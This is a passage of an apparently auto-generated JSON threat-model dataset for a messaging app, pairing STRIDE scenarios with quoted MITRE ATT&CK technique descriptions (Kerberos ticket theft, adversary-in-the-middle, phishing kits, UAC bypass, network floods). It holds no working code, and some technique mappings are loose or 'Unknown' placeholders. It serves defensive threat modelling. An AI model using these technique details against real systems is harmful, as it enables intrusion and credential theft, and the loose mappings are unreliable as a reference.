                "description": "Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \u201crealms\u201d, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.\n\nOn Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)\n\nLinux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the \"ccache\". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.(Citation: MIT ccache) On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in <code>/var/lib/sss/secrets/secrets.ldb</code> as well as the corresponding key located in <code>/var/lib/sss/secrets/.secrets.mkey</code>. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). The ccache file may also be converted into a Windows format using tools such as Kekeo.(Citation: Linux Kerberos Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo)\n\n\nKerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using <code>kinit</code>, <code>klist</code>, <code>ktutil</code>, and <code>kcc</code> built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: macOS kerberos framework MIT)\n",
                "id": "attack-pattern--3fc01293-ef5e-41c6-86ce-61f10706b64a",
                "technique_id": "T1558"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker leverages a common vulnerability in the Signal Protocol to decrypt intercepted messages.",
            "Assumptions": [
                {
                    "Assumption": "There is a known vulnerability in the Signal Protocol implementation.",
                    "Role": "Application Developer",
                    "Condition": "When vulnerabilities are unpatched or undisclosed."
                },
                {
                    "Assumption": "The attacker can intercept the encrypted message during transmission.",
                    "Role": "Attacker",
                    "Condition": "With access to the communication channel."
                },
                {
                    "Assumption": "The user\u2019s private keys or session keys are compromised or known.",
                    "Role": "Attacker",
                    "Condition": "Through prior attacks or other security breaches."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive message content.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "encryption",
                "protocol",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An external attacker uses a phishing campaign to trick users into revealing their private keys.",
            "Assumptions": [
                {
                    "Assumption": "Users are susceptible to phishing attempts.",
                    "Role": "End-user",
                    "Condition": "When not educated about phishing risks and detection."
                },
                {
                    "Assumption": "Phishing attempts are capable of mimicking legitimate communications convincingly.",
                    "Role": "Attacker",
                    "Condition": "With access to social engineering tools and techniques."
                },
                {
                    "Assumption": "The application does not implement additional verifications to prevent phishing.",
                    "Role": "Application Developer",
                    "Condition": "When lacking multi-factor authentication and warning mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized access to encrypted communications.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "phishing",
                "social engineering",
                "private keys"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP)\n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
                "id": "attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230",
                "technique_id": "T1598.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overwhelms the messaging service with excessive traffic, rendering it inaccessible to legitimate users.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has sufficient resources to generate large volumes of traffic.",
                    "Role": "Attacker",
                    "Condition": "When using botnets or distributed attack networks."
                },
                {
                    "Assumption": "The messaging system lacks adequate protections against DDoS attacks.",
                    "Role": "Application Developer",
                    "Condition": "When without anti-DDoS measures and traffic monitoring."
                },
                {
                    "Assumption": "Network infrastructure can be saturated beyond its handling capacity.",
                    "Role": "Network Administrator",
                    "Condition": "With existing bandwidth limitations and lack of flexibility."
                }
            ],
            "Potential Impact": "Service availability is compromised, preventing legitimate communication.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network flooding",
                "DDoS",
                "traffic generation"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a software vulnerability to crash the desktop client's application, causing repeated interruptions.",
            "Assumptions": [
                {
                    "Assumption": "There are exploitable vulnerabilities in the desktop client's software.",
                    "Role": "Application Developer",
                    "Condition": "When the software is unpatched or outdated."
                },
                {
                    "Assumption": "The attacker can trigger the vulnerability remotely.",
                    "Role": "Attacker",
                    "Condition": "Through network access or crafted exploit payloads."
                },
                {
                    "Assumption": "The desktop client does not have recovery mechanisms for such crashes.",
                    "Role": "Application Developer",
                    "Condition": "When lacking error recovery and crash handling features."
                }
            ],
            "Potential Impact": "User productivity is impacted due to frequent application crashes.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "software crash",
                "vulnerability exploitation",
                "desktop client"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker manipulates the encryption protocol handshake to cause excessive resource consumption on the primary device.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can manipulate the initial handshake messages.",
                    "Role": "Attacker",
                    "Condition": "During the connection establishment phase."
                },
                {
                    "Assumption": "The encryption protocol allows for multiple handshake requests without verification.",
                    "Role": "Application Developer",
                    "Condition": "When not implementing checks to limit handshake attempts."
                },
                {
                    "Assumption": "The primary device cannot properly handle excessive handshake attempts.",
                    "Role": "End-user",
                    "Condition": "When using devices with limited resources."
                }
            ],
            "Potential Impact": "The primary device becomes unresponsive, affecting communication availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "encryption handshake",
                "resource exhaustion",
                "primary device"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a privilege escalation vulnerability in the messaging application to gain higher-level access.",
            "Assumptions": [
                {
                    "Assumption": "A privilege escalation vulnerability exists in the application.",
                    "Role": "Application Developer",
                    "Condition": "When the application is unpatched or has security flaws."
                },
                {
                    "Assumption": "The attacker has initial access to the system.",
                    "Role": "Attacker",
                    "Condition": "Through prior exploits or user errors."
                },
                {
                    "Assumption": "The system does not have sufficient access control mechanisms to prevent privilege abuse.",
                    "Role": "System Administrator",
                    "Condition": "When lacking robust access control policies."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and system features.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "access control",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker sends specially crafted requests to the desktop client, exploiting poorly validated input to execute administrative commands.",
            "Assumptions": [
                {
                    "Assumption": "The desktop client does not properly validate input.",
                    "Role": "Application Developer",
                    "Condition": "When input validation is weak or absent."
                },
                {
                    "Assumption": "The attacker can send these requests over the network.",
                    "Role": "Attacker",
                    "Condition": "When able to interact with the desktop client."
                },
                {
                    "Assumption": "There are administrative commands accessible via network requests.",
                    "Role": "Application Developer",
                    "Condition": "When remote administration features are exposed."
                }
            ],
            "Potential Impact": "Compromise of application and data integrity.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "input validation",
                "administrative commands",
                "desktop client"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user gains unauthorized administrative access by exploiting weak permissions set on companion device linking features.",
            "Assumptions": [
                {
                    "Assumption": "Companion device linking features have weak or incorrectly set permissions.",
                    "Role": "Application Developer",
                    "Condition": "When security settings are misconfigured."
                },
                {
                    "Assumption": "The user attempting privilege escalation has basic access to a linked device.",
                    "Role": "End-user",
                    "Condition": "When logged in with standard user privileges."
                },
                {
                    "Assumption": "There are no additional verifications on actions initiated from linked devices.",
                    "Role": "System Administrator",
                    "Condition": "When lacking secondary verification mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized administrative access to the messaging platform.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "companion device",
                "permissions",
                "privilege abuse"
            ],
            "mitre_technique": {
                "name": "Bypass User Account Control",
                "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",
                "id": "attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073",
                "technique_id": "T1548.002"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "26",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake version of the messaging app's login page to harvest user credentials.",
            "Assumptions": [
                {
                    "Assumption": "Users will not be able to distinguish between the real and fake login pages.",
                    "Role": "User",
                    "Condition": "User awareness and discernment are low."
                },
                {
                    "Assumption": "The attacker has the capability to host and promote the fake login page.",
                    "Role": "Attacker",
                    "Condition": "Access to the resources required to host and distribute fake content."
                },
                {
                    "Assumption": "Users might visit the fake login page via phishing emails or malicious ads.",
                    "Role": "User",
                    "Condition": "Users are likely to click on phishing emails or malicious advertisements."
                }
            ],
            "Potential Impact": "Compromise of user credentials and unauthorized account access.",
            "MITRE ATT&CK Keywords": [
                "credential harvesting",
                "phishing",
                "spoofing",
                "webpage"
            ],
            "mitre_technique": {
                "name": "Spearphishing Attachment",
                "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
                "id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
                "technique_id": "T1566.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts the device's communication with a companion device to impersonate the primary device.",
            "Assumptions": [
                {
                    "Assumption": "The attacker is on the same network as the target device.",
                    "Role": "Attacker",
                    "Condition": "The attacker can gain access to the victim's local network."
                },
                {
                    "Assumption": "Users are unaware of the network interception.",
                    "Role": "User",
                    "Condition": "User vigilance is compromised or non-existent."
                },
                {
                    "Assumption": "The attacker can imitate the initial handshake between devices.",
                    "Role": "Attacker",
                    "Condition": "Technical capability to perform man-in-the-middle attacks."
                }
            ],
            "Potential Impact": "Unauthorized access to user messages and potential data manipulation.",
            "MITRE ATT&CK Keywords": [
                "network interception",
                "MITM",
                "device impersonation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a malicious desktop client that users believe to be a legitimate companion device.",
            "Assumptions": [
                {
                    "Assumption": "Users do not verify the authenticity of the desktop client.",
                    "Role": "User",
                    "Condition": "Users lack awareness or neglect verification steps."
                },
                {
                    "Assumption": "The attacker distributes the malicious client through trusted channels.",
                    "Role": "Attacker",
                    "Condition": "Access to trusted distribution methods, such as app stores or trusted download sites."
                },
                {
                    "Assumption": "The malicious client can successfully link to the primary device.",
                    "Role": "Attacker",
                    "Condition": "Technical capability to bypass security checks during linking."
                }
            ],
            "Potential Impact": "Full access to encrypted messages and user data.",
            "MITRE ATT&CK Keywords": [
                "malicious client",
                "trusted channels",
                "client spoofing"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the local SQLite database to alter pre-keys or authentication credentials.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has local access to the victim's device.",
                    "Role": "Attacker",
                    "Condition": "Attacker can gain physical or remote access to the device."
                },
                {
                    "Assumption": "SQLite database is insufficiently protected.",
                    "Role": "Application",
                    "Condition": "Weak encryption or inadequate access controls on the database."
                },
                {
                    "Assumption": "The attacker has knowledge of the database structure.",
                    "Role": "Attacker",
                    "Condition": "Technical understanding of the database schema in use."
                }
            ],
            "Potential Impact": "Unauthorized message decryption and potential data corruption.",
            "MITRE ATT&CK Keywords": [
                "local tampering",
                "database modification",
                "credential altering"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the application code during updates to introduce vulnerabilities.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept the update process.",
                    "Role": "Attacker",
                    "Condition": "Ability to perform man-in-the-middle attacks during software updates."
                },
                {
                    "Assumption": "Users update the application without verifying the integrity.",
                    "Role": "User",
                    "Condition": "Users accept updates without validation."
                },
                {
                    "Assumption": "The application does not adequately validate update sources.",
                    "Role": "Application",
                    "Condition": "Lack of update integrity checks."
                }
            ],
            "Potential Impact": "Introduction of malware and vulnerabilities, compromising the entire system.",
            "MITRE ATT&CK Keywords": [
                "update tampering",
                "code injection",
                "software supply chain"
            ],
            "mitre_technique": {
                "name": "Compromise Software Supply Chain",
                "description": "Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011)  ",
                "id": "attack-pattern--bd369cd9-abb8-41ce-b5bb-fff23ee86c00",
                "technique_id": "T1195.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the network traffic to inject malicious messages into the communication stream.",
            "Assumptions": [
                {
                    "Assumption": "The attacker is positioned to intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Has access to the same network or can perform DNS spoofing."
                },
                {
                    "Assumption": "The attacker can interpret the communication protocol in use.",
                    "Role": "Attacker",
                    "Condition": "Technical knowledge of the secure communication protocol."
                },
                {
                    "Assumption": "The system does not fully authenticate incoming messages.",
                    "Role": "Application",
                    "Condition": "Weaknesses in message integrity checks."
                }
            ],
            "Potential Impact": "Injection of malicious commands or unauthorized data transfers.",
            "MITRE ATT&CK Keywords": [
                "traffic manipulation",
                "injection",
                "network tampering"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny having sent or received certain messages after they have been undeniably delivered and read.",
            "Assumptions": [
                {
                    "Assumption": "The messaging application does not provide robust logging.",
                    "Role": "Application",
                    "Condition": "Lack of non-repudiation controls such as timestamps or logs."
                },
                {
                    "Assumption": "Users abuse lack of proper audit trails.",
                    "Role": "User",
                    "Condition": "Users can claim plausible deniability."
                },
                {
                    "Assumption": "The application does not support features that ensure message delivery verifiability.",
                    "Role": "Application",
                    "Condition": "No message verification mechanisms in place."
                }
            ],
            "Potential Impact": "Disputes over message authenticity and delivery status.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "non-repudiation",
                "message dispute"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
